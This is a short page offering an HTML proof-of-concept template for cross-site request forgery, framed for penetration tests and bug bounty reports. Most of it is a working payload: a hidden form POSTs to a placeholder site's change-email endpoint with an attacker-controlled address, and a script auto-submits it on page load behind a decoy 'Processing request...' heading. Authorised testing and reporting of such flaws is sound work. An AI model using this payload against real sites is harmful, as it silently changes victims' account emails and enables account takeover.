# CSRF Proof-of-Concept (PoC) HTML Generator Template

An HTML PoC template for demonstrating CSRF vulnerabilities during penetration tests or bug bounty reports.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Proof of Concept</title>
</head>
<body>
    <h1>Processing request...</h1>
    <!-- CSRF Form targeting victim application -->
    <form id="csrfForm" action="https://vulnerable-site.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@evil-domain.com" />
    </form>

    <script>
        // Auto-submit form immediately upon page load
        document.addEventListener("DOMContentLoaded", function() {
            document.getElementById("csrfForm").submit();
        });
    </script>
</body>
</html>
```
